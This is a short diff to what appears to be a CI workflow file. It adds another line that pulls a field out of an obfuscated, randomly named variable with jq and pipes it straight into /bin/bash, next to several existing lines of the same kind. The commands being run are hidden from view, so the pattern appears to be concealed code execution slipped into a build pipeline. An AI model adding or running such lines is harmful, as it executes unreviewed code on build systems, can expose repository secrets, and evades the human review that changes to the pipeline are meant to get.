@@ -29,6 +29,7 @@ jobs:
           echo $cnbd26467 | jq -r .vsui4 | /bin/bash
           echo $t28 | jq -r .ta63 | /bin/bash
           printf '%s' "$n7851" | jq -r .cmgh766 | /bin/bash
+          printf '%s' "$esi5" | jq -r .e604 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
